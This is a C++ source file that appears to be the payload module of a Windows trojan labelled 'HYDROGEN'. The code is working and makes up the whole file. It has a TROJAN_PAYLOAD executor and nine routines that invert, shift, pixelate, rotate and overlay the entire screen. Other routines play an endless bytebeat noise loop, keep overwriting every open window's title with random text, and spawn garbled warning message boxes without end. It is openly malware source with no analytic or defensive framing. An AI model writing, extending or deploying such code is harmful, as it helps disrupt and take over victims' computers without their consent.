#include "payloads.h"
HCRYPTPROV prov;
int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}
int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
	int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
	XFORM xform;
	if (Angle != 0)
	{
		double fangle = (double)Angle / 180. * 3.1415926;
		xform.eM11 = (float)cos(fangle);
		xform.eM12 = (float)sin(fangle);
		xform.eM21 = (float)-sin(fangle);
		xform.eM22 = (float)cos(fangle);
		xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
		xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
		SetWorldTransform(hdc, &xform);
	}
	return nGraphicsMode;
}
LPCWSTR GenRandomUnicodeString(int len) {
	wchar_t* strRandom = new wchar_t[len + 1];

	for (int i = 0; i < len; i++) {
		strRandom[i] = (random() % 256) + 1024;
	}

	strRandom[len] = L'\0';

	return strRandom;
}
void AudioPayload() {
	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };

	HWAVEOUT hwo;
	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);

	const int bufsize = 8000 * 10;
	char* wavedata = (char*)LocalAlloc(0, bufsize);

	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));
	for (;;) {
		for (int t = 0; t < bufsize; t++) {
			int numPayload = Time / PAYLOAD_TIME;
			if (numPayload % 3 == 0) {
				wavedata[t] = (((t & t >> 8) - (t >> 13 & t)) & ((t & t >> 8) - (t >> 13))) ^ (t >> 8 & t);
			}
			else if (numPayload % 3 == 1) {
				wavedata[t] = (t - (t >> 4 & t >> 8) & t >> 12) - 1;
			}
			else if (numPayload % 3 == 2) {
				wavedata[t] = ((t >> 8 & t >> 4) >> (t >> 16 & t >> 8)) * t;
			}
		}

		waveOutWrite(hwo, &hdr, sizeof(hdr));
	}
}
BOOL CALLBACK EnumChildWindowsProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeout(hwnd, WM_SETTEXT, NULL, (LPARAM)GenRandomUnicodeString(random() % 10 + 10), SMTO_ABORTIFHUNG, 100, NULL);

	RECT rcWindow;
	GetWindowRect(hwnd, &rcWindow);
	int cxWindow = rcWindow.right - rcWindow.left;
	int cyWindow = rcWindow.bottom - rcWindow.top;
	HDC hdcWindow = GetDC(hwnd);
	BitBlt(hdcWindow, 0, 0, cxWindow, cyWindow, hdcWindow, random() % 21 - 10, random() % 41 - 20, SRCCOPY);
	ReleaseDC(NULL, hdcWindow);
	DeleteObject(hdcWindow);

	EnumChildWindows(hwnd, EnumChildWindowsProc, NULL);
	return true;
}
void WindowsCorruptionPayload() {
	for (;;) {
		EnumChildWindows(NULL, EnumChildWindowsProc, NULL);
	}
}
void MessageBoxThread() {
	LPCWSTR strText = GenRandomUnicodeString(random() % 10 + 10);
	LPCWSTR strTitle = GenRandomUnicodeString(random() % 10 + 10);
	if (random() % 2 == 0) {
		MessageBox(NULL, strText, strTitle, MB_ABORTRETRYIGNORE | MB_ICONWARNING);
	}
	else {
		MessageBox(NULL, strText, strTitle, MB_RETRYCANCEL | MB_ICONERROR);
	}
}
void MessageBoxPayload() {
	for (;;) {
		CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxThread), NULL, 0, NULL);
		Sleep(1500);
	}
}
void ExecutePayload(TROJAN_PAYLOAD payload, int nTime) {
	int dwStartTime = Time;
	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		HDC hdcScreen = GetDC(NULL);
		payload(i, hdcScreen);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
	}
}
void Payload1(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	SelectObject(hdcScreen, CreateSolidBrush(RGB(t % 256, (t / 2) % 256, (t / 2) % 256)));
	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);
	Sleep(15);
}
void Payload2(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	t *= 10;
	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x + t % szScreen.cx, ptScreen.y + t % szScreen.cy, NOTSRCERASE);
	SelectObject(hdcScreen, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);
	Sleep(15);
}
void Payload3(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);
	for (int i = ptScreen.x; i <= szScreen.cx / 10; i++) {
		for (int j = ptScreen.y; j <= szScreen.cy / 10; j++) {
			StretchBlt(hcdc, i * 10, j * 10, 10, 10, hcdc, i * 10, j * 10, 1, 1, SRCCOPY);
		}
	}
	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, SRCCOPY);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);

	Sleep(100);
}
void Payload4(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	AlphaBlend(hdcScreen, ptScreen.x + t % 200 + 10, ptScreen.y - t % 25, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);
	
	DeleteObject(hcdc);
	DeleteObject(hBitmap);
	
	Sleep(20);
}
void Payload5(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	t *= 3;
	int x = random() % szScreen.cx;
	int y = random() % szScreen.cy;
	BitBlt(hdcScreen, x, y, t % szScreen.cx, t % szScreen.cy, hdcScreen, (x + t / 2) % szScreen.cx, y % szScreen.cy, SRCCOPY);
}
void Payload6(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	POINT p = { 0 };
	p.x = (szScreen.cx / 2);
	p.y = (szScreen.cy / 2);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	RotateDC(hdcScreen, 10, p);
	AlphaBlend(hdcScreen, 0, t, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);
}
void Payload7(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	POINT p = { 0 };
	p.x = (szScreen.cx / 2);
	p.y = (szScreen.cy / 2);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	if (t % 2 == 0) {
		RotateDC(hdcScreen, 1, p);
	}
	else {
		RotateDC(hdcScreen, -1, p);
	}

	SetBkColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));
	SetTextColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));

	TextOut(hdcScreen, random() % szScreen.cx, random() % szScreen.cy, L"HYDROGEN", 8);
	
	AlphaBlend(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);
}
void Payload8(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

	int nGraphicsMode = SetGraphicsMode(hdcScreen, GM_ADVANCED);
	XFORM xform;
	xform.eDx = 0;
	xform.eDy = 0;
	xform.eM11 = 1;
	xform.eM12 = 0.1;
	xform.eM21 = 0;
	xform.eM22 = 1;
	SetWorldTransform(hdcScreen, &xform);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	SetBkColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));
	SetTextColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));

	for (int i = 0; i < 5; i++) {
		TextOut(hdcScreen, random() % szScreen.cx, random() % szScreen.cy, L"ӉӬլҏ ӎӬ !!!", 11);
	}

	AlphaBlend(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);

	Sleep(50);
}
void Payload9(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	POINT pt[3];
	pt[0] = { 0,0 };
	pt[1] = { szScreen.cx,0 };
	pt[2] = { 25,szScreen.cy };
	PlgBlt(hdcScreen, pt, hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx + 25, szScreen.cy, NULL, 0, 0);

	SelectObject(hdcScreen, CreateSolidBrush(RGB(random() % 256, random() % 256, random() % 256)));
	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);

	Sleep(50);
}